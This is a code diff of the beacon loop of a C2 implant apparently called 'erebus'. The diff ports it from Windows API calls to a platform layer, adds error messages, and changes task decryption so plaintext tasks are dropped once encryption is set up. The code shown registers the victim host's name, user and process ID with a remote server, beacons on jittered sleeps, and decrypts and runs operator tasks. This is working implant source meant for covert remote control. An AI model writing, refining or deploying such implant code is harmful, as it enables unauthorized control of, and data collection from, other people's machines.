@@ -1,14 +1,12 @@
-#define WIN32_LEAN_AND_MEAN
-#include <windows.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <time.h>
 
 #include "erebus/beacon.h"
 #include "erebus/config.h"
 #include "erebus/crypto.h"
 #include "erebus/pb_c2.h"
-#include "erebus/syscall.h"
+#include "erebus/platform.h"
 #include "erebus/tasks.h"
 #include "erebus/transport.h"
 
@@ -28,27 +26,15 @@ typedef struct erebus_state {
     size_t            pending_count;
 } erebus_state;
 
-static void get_identity(char *hostname, size_t hcap, char *username, size_t ucap, uint32_t *pid, char *integrity, size_t icap) {
-    DWORD sz = (DWORD)hcap;
-    GetComputerNameA(hostname, &sz);
-    sz = (DWORD)ucap;
-    GetUserNameA(username, &sz);
-    *pid = GetCurrentProcessId();
-    strncpy(integrity, "medium", icap - 1);
-}
-
-static int64_t unix_time(void) {
-    return (int64_t)time(NULL);
-}
-
 static int erebus_register(erebus_state *st) {
     erebus_register_msg msg;
     memset(&msg, 0, sizeof(msg));
     strncpy(msg.implant_id, EREBUS_IMPLANT_ID, sizeof(msg.implant_id) - 1);
-    get_identity(msg.hostname, sizeof(msg.hostname), msg.username, sizeof(msg.username), &msg.pid, msg.integrity_level, sizeof(msg.integrity_level));
-    strncpy(msg.os, "windows", sizeof(msg.os) - 1);
-    strncpy(msg.arch, "amd64", sizeof(msg.arch) - 1);
-    msg.timestamp = unix_time();
+    erebus_get_identity(msg.hostname, sizeof(msg.hostname), msg.username, sizeof(msg.username),
+        &msg.pid, msg.integrity_level, sizeof(msg.integrity_level));
+    strncpy(msg.os, erebus_os_name(), sizeof(msg.os) - 1);
+    strncpy(msg.arch, erebus_arch_name(), sizeof(msg.arch) - 1);
+    msg.timestamp = erebus_unix_ms();
     if (!erebus_hmac_sha256(st->secret, st->secret_len,
             (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
         return 0;
@@ -92,7 +78,7 @@ static erebus_beacon_resp *erebus_send_beacon(erebus_state *st) {
     memset(&msg, 0, sizeof(msg));
     strncpy(msg.implant_id, EREBUS_IMPLANT_ID, sizeof(msg.implant_id) - 1);
     strncpy(msg.session_id, st->session_id, sizeof(msg.session_id) - 1);
-    msg.timestamp = unix_time();
+    msg.timestamp = erebus_unix_ms();
     if (!erebus_hmac_sha256(st->secret, st->secret_len,
             (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
         return NULL;
@@ -142,30 +128,40 @@ static void erebus_free_result(erebus_task_result *r) {
 }
 
 int erebus_beacon_run(void) {
-    if (!erebus_syscall_init()) return 1;
+    if (!erebus_platform_init()) return 1;
 
     erebus_state st;
     memset(&st, 0, sizeof(st));
     st.sleep_ms = EREBUS_SLEEP_MS > 0 ? (uint32_t)EREBUS_SLEEP_MS : 5000;
     st.jitter_pct = EREBUS_JITTER_PCT;
 
-    if (!erebus_hex_decode(EREBUS_IMPLANT_SECRET, st.secret, sizeof(st.secret), &st.secret_len) || st.secret_len != 32)
+    if (!erebus_hex_decode(EREBUS_IMPLANT_SECRET, st.secret, sizeof(st.secret), &st.secret_len) || st.secret_len != 32) {
+        fprintf(stderr, "erebus: invalid IMPLANT_SECRET (need 32-byte hex)\n");
         return 1;
+    }
 
     const char *tt = EREBUS_TRANSPORT_TYPE[0] ? EREBUS_TRANSPORT_TYPE : "https";
-    if (!erebus_transport_create(tt, &st.transport)) return 1;
+    if (strcmp(tt, "https") == 0 && EREBUS_CA_CERT_PEM[0] == '\0') {
+        fprintf(stderr, "erebus: HTTPS requires CA pin (CA_CERT_PATH=.../ca-cert.pem at build)\n");
+        return 1;
+    }
+    if (!erebus_transport_create(tt, &st.transport)) {
+        fprintf(stderr, "erebus: transport create failed (type=%s; check CA pin / libs)\n", tt);
+        return 1;
+    }
 
     for (int i = 0; i < 10 && !st.session_id[0]; i++) {
         if (erebus_register(&st)) break;
-        Sleep(erebus_jitter_ms(st.sleep_ms * (uint32_t)(i + 1), st.jitter_pct));
+        erebus_sleep_ms(erebus_jitter_ms(st.sleep_ms * (uint32_t)(i + 1), st.jitter_pct));
     }
     if (!st.session_id[0]) {
+        fprintf(stderr, "erebus: register failed after retries (callback/CA/HMAC/skew)\n");
         erebus_transport_destroy(st.transport);
         return 1;
     }
 
     for (;;) {
-        Sleep(erebus_jitter_ms(st.sleep_ms, st.jitter_pct));
+        erebus_sleep_ms(erebus_jitter_ms(st.sleep_ms, st.jitter_pct));
 
         erebus_beacon_resp *resp = erebus_send_beacon(&st);
         if (!resp) continue;
@@ -179,28 +175,45 @@ int erebus_beacon_run(void) {
         if (resp->next_checkin_ms > 0)
             st.sleep_ms = (uint32_t)resp->next_checkin_ms;
 
-        erebus_task *tasks = resp->tasks;
-        size_t task_count = resp->task_count;
+        /*
+         * Task source (match Go implant decryptTasks):
+         * - No session key yet: allow plaintext tasks (pre-crypto path).
+         * - Session key set: ONLY encrypted_tasks; ignore plaintext field.
+         *   Empty/invalid/failed decrypt → execute nothing (fail closed).
+         */
+        erebus_task *tasks = NULL;
+        size_t task_count = 0;
+        int own_tasks = 0;
 
-        if (st.has_session_key && resp->encrypted_tasks_len > 0) {
-            uint8_t *plain = NULL;
-            size_t plain_len = 0;
-            if (erebus_aes_gcm_decrypt(st.session_key, resp->encrypted_tasks, resp->encrypted_tasks_len, &plain, &plain_len)) {
-                erebus_task *decoded = NULL;
-                size_t decoded_count = 0;
-                if (erebus_pb_decode_tasks_payload(plain, plain_len, &decoded, &decoded_count)) {
-                    erebus_pb_free_tasks(resp->tasks, resp->task_count);
-                    resp->tasks = NULL;
-                    resp->task_count = 0;
-                    tasks = decoded;
-                    task_count = decoded_count;
+        if (st.has_session_key) {
+            if (resp->encrypted_tasks_len > 0) {
+                uint8_t *plain = NULL;
+                size_t plain_len = 0;
+                if (erebus_aes_gcm_decrypt(st.session_key, resp->encrypted_tasks,
+                        resp->encrypted_tasks_len, &plain, &plain_len)) {
+                    erebus_task *decoded = NULL;
+                    size_t decoded_count = 0;
+                    if (erebus_pb_decode_tasks_payload(plain, plain_len, &decoded, &decoded_count)) {
+                        tasks = decoded;
+                        task_count = decoded_count;
+                        own_tasks = 1;
+                    }
+                    free(plain);
                 }
-                free(plain);
             }
+            /* Drop any plaintext tasks so free_beacon_resp does not re-execute paths. */
+            erebus_pb_free_tasks(resp->tasks, resp->task_count);
+            resp->tasks = NULL;
+            resp->task_count = 0;
+        } else {
+            tasks = resp->tasks;
+            task_count = resp->task_count;
         }
 
         for (size_t i = 0; i < task_count; i++) {
             if (tasks[i].task_type == EREBUS_TASK_EXIT) {
+                if (own_tasks)
+                    erebus_pb_free_tasks(tasks, task_count);
                 erebus_pb_free_beacon_resp(resp);
                 erebus_transport_destroy(st.transport);
                 return 0;
@@ -231,6 +244,8 @@ int erebus_beacon_run(void) {
             }
         }
 
+        if (own_tasks)
+            erebus_pb_free_tasks(tasks, task_count);
         erebus_pb_free_beacon_resp(resp);
     }
 
